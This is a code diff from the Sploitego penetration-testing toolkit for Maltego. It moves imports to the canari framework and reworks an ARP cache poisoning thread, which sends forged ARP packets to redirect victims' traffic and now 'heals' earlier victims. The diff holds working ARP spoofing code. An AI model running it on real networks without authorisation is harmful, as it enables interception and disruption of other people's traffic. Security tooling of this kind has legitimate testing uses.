@@ -5,13 +5,15 @@ from Queue import Queue, Empty
 from threading import Thread
 from time import sleep
 
-from scapy.all import Ether, ARP, IP, TCP, ICMP, sendp, srp, RandShort, RandInt
-from sploitego.maltego.message import Label, Netblock, IPv4Address
-from sploitego.framework import configure, superuser
-from sploitego.iptools.ip import iprange, portrange
+from scapy.all import Ether, ARP, IP, TCP, ICMP, sendp, srp, RandShort, RandInt, arping
+from canari.maltego.entities import Netblock, IPv4Address
+from canari.framework import configure, superuser
 from common.entities import Port, PortStatus
-from sploitego.maltego.utils import debug
-from sploitego.config import config
+from iptools.ip import iprange, portrange
+from canari.maltego.message import Label
+from canari.maltego.utils import debug
+from canari.config import config
+
 
 __author__ = 'Nadeem Douba'
 __copyright__ = 'Copyright 2012, Sploitego Project'
@@ -37,6 +39,12 @@ class ArpCachePoisoner(Thread):
         self.poison_rate = config['irsscan/poison_rate']
         super(ArpCachePoisoner, self).__init__()
 
+    def whohas(self, ip):
+        ans = arping(ip, verbose=False)[0]
+        if not ans:
+            return None
+        return ans[0][1].hwsrc
+
     def run(self):
 
         debug('ARP cache poisoning thread waiting for victims...')
@@ -44,20 +52,32 @@ class ArpCachePoisoner(Thread):
         debug('Acquired first victim... %s' % ip)
 
         pe = Ether(src=self.mac, dst=self.rmac)
-        pa = ARP(op='is-at', hwsrc=self.mac, psrc=ip, hwdst=self.rmac)
+        pa = ARP(op='who-has', hwsrc=self.mac, psrc=ip, pdst=ip, hwdst=self.rmac)
+
+        oldmac = self.whohas(ip)
+        oldip = ip
 
         while True:
             try:
                 ip = q.get_nowait()
+                if oldmac is not None:
+                    debug('Healing victim %s/%s' % (oldip, oldmac))
+                    pa.psrc = oldip
+                    pa.hwsrc = oldmac
+                    sendp(pe/pa, verbose=0)
                 if ip is None:
                     break
                 else:
                     debug('Changing victim to %s...' % ip)
                     pa.psrc = ip
+                    pa.hwsrc = self.mac
+                    oldip = ip
+                    oldmac = self.whohas(ip)
             except Empty:
                 # Send the poison... all your base are belong to us!
                 sendp(pe/pa, verbose=0)
                 sleep(1/self.poison_rate)
+
 
 
 def parse_args(args):
